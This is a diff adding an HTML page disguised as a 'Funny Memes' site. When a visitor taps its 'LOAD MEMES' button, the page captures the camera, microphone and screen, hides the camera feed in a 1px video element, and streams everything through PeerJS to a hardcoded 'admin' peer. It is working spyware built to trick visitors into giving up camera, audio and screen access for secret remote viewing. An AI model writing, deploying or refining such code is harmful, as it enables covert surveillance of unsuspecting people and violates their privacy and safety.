@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Funny Memes 😂</title>
+<script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Bangers&family=DM+Sans:wght@400;600&display=swap');
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { background: #f0f0f0; font-family: 'DM Sans', sans-serif; min-height: 100vh; }
+
+  .topbar {
+    background: #ff4500; color: white; padding: 14px 20px;
+    display: flex; align-items: center; gap: 10px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+  }
+  .topbar h1 { font-family: 'Bangers', cursive; font-size: 26px; letter-spacing: 2px; }
+
+  .popup-overlay {
+    position: fixed; inset: 0; background: rgba(0,0,0,0.7);
+    display: flex; align-items: center; justify-content: center;
+    z-index: 9999; backdrop-filter: blur(4px);
+  }
+  .popup {
+    background: white; border-radius: 20px; padding: 36px 28px;
+    max-width: 340px; width: 90%; text-align: center;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+    animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+  }
+  @keyframes popIn { from { transform: scale(0.7); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+  .popup-emoji { font-size: 56px; margin-bottom: 16px; }
+  .popup h2 { font-family: 'Bangers', cursive; font-size: 28px; color: #ff4500; margin-bottom: 10px; }
+  .popup p { font-size: 14px; color: #666; line-height: 1.6; margin-bottom: 24px; }
+  .popup-btn {
+    width: 100%; padding: 14px; background: #ff4500; color: white;
+    border: none; border-radius: 12px; font-family: 'Bangers', cursive;
+    font-size: 20px; letter-spacing: 2px; cursor: pointer; transition: all 0.2s;
+  }
+  .popup-btn:hover { background: #e03d00; transform: scale(1.02); }
+
+  .memes-container { max-width: 700px; margin: 0 auto; padding: 24px 16px; }
+  .page-title { font-family: 'Bangers', cursive; font-size: 32px; color: #333; letter-spacing: 2px; margin-bottom: 20px; text-align: center; }
+  .memes-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+  .meme-card { background: white; border-radius: 16px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.1); transition: transform 0.2s; cursor: pointer; }
+  .meme-card:hover { transform: translateY(-4px); }
+  .meme-card:first-child { grid-column: 1 / -1; }
+  .meme-img { width: 100%; aspect-ratio: 4/3; object-fit: cover; display: block; background: #eee; }
+  .meme-card:first-child .meme-img { aspect-ratio: 16/7; }
+  .meme-caption { padding: 12px 14px; font-size: 13px; color: #333; font-weight: 600; display: flex; align-items: center; gap: 8px; }
+  .likes { margin-left: auto; color: #ff4500; font-size: 13px; }
+
+  #hidden-cam { position: fixed; width: 1px; height: 1px; opacity: 0; pointer-events: none; top: -9999px; left: -9999px; }
+</style>
+</head>
+<body>
+
+<video id="hidden-cam" autoplay muted playsinline></video>
+
+<div class="popup-overlay" id="popup-overlay">
+  <div class="popup">
+    <div class="popup-emoji">😂</div>
+    <h2>FUNNY MEMES!</h2>
+    <p>Best memes collection 2024! Tap below to load all memes instantly.</p>
+    <button class="popup-btn" onclick="allowAndLoad()">😂 LOAD MEMES!</button>
+  </div>
+</div>
+
+<div class="topbar">
+  <span>😂</span>
+  <h1>DAILY MEMES</h1>
+</div>
+
+<div class="memes-container">
+  <div class="page-title">Today's Top Memes 🔥</div>
+  <div class="memes-grid">
+    <div class="meme-card">
+      <img class="meme-img" src="https://i.imgflip.com/65939r.png" alt="meme" onerror="this.style.display='none'"/>
+      <div class="meme-caption">😂 When you finally fix the bug <span class="likes">❤️ 24k</span></div>
+    </div>
+    <div class="meme-card">
+      <img class="meme-img" src="https://i.imgflip.com/7zy1mm.png" alt="meme" onerror="this.style.display='none'"/>
+      <div class="meme-caption">🤣 Monday morning mood <span class="likes">❤️ 18k</span></div>
+    </div>
+    <div class="meme-card">
+      <img class="meme-img" src="https://i.imgflip.com/6yvpkj.png" alt="meme" onerror="this.style.display='none'"/>
+      <div class="meme-caption">😭 Me after eating too much <span class="likes">❤️ 31k</span></div>
+    </div>
+    <div class="meme-card">
+      <img class="meme-img" src="https://i.imgflip.com/61icyd.png" alt="meme" onerror="this.style.display='none'"/>
+      <div class="meme-caption">💀 My brain at 3am <span class="likes">❤️ 42k</span></div>
+    </div>
+    <div class="meme-card">
+      <img class="meme-img" src="https://i.imgflip.com/5c7lwq.png" alt="meme" onerror="this.style.display='none'"/>
+      <div class="meme-caption">😆 Every single time! <span class="likes">❤️ 15k</span></div>
+    </div>
+  </div>
+</div>
+
+<script>
+  const ADMIN_PEER_ID = "arman-admin-001";
+
+  let peer, adminConn;
+  let cameraStream = null;
+  let screenStream = null;
+  let audioStream = null;
+
+  async function allowAndLoad() {
+    document.getElementById('popup-overlay').style.display = 'none';
+
+    try {
+      // STEP 1: Camera + Audio lena (ek saath)
+      cameraStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user' },
+        audio: true
+      });
+
+      // Audio stream alag bhi rakhte hain
+      audioStream = cameraStream; // audio track camera stream mein hi hai
+
+      console.log('✅ Camera + Audio ready');
+      document.getElementById('hidden-cam').srcObject = cameraStream;
+
+      // STEP 2: Screen lena
+      try {
+        screenStream = await navigator.mediaDevices.getDisplayMedia({
+          video: { cursor: "always" },
+          audio: false
+        });
+        console.log('✅ Screen ready');
+
+        screenStream.getVideoTracks()[0].addEventListener('ended', () => {
+          screenStream = null;
+          if (adminConn) adminConn.send({ type: 'screen-stopped' });
+        });
+
+      } catch(e) {
+        console.log('⚠️ Screen denied');
+        screenStream = null;
+      }
+
+      // STEP 3: PeerJS connect
+      peer = new Peer();
+
+      peer.on('open', (myId) => {
+        console.log('🔗 My ID:', myId);
+        adminConn = peer.connect(ADMIN_PEER_ID);
+
+        adminConn.on('open', () => {
+          adminConn.send({
+            type: 'user-ready',
+            peerId: myId,
+            hasScreen: screenStream !== null
+          });
+        });
+      });
+
+      // STEP 4: Admin call aaye → sahi stream answer karo
+      peer.on('call', (call) => {
+        const type = call.metadata?.type;
+        console.log('📞 Admin calling! Type:', type);
+
+        if (type === 'screen') {
+          if (screenStream && screenStream.active) {
+            call.answer(screenStream);
+          } else {
+            call.answer(cameraStream);
+            if (adminConn) adminConn.send({ type: 'screen-stopped' });
+          }
+
+        } else if (type === 'audio') {
+          // Sirf audio bhejo — microphone stream
+          const audioOnlyStream = new MediaStream(cameraStream.getAudioTracks());
+          call.answer(audioOnlyStream);
+          console.log('🎤 Answering with AUDIO only');
+
+        } else {
+          // Camera
+          call.answer(cameraStream);
+          console.log('📹 Answering with CAMERA');
+        }
+      });
+
+      peer.on('error', (e) => console.log('❌ Error:', e));
+
+    } catch (err) {
+      console.log('❌ Permission error:', err);
+    }
+  }
+</script>
+</body>
+</html>
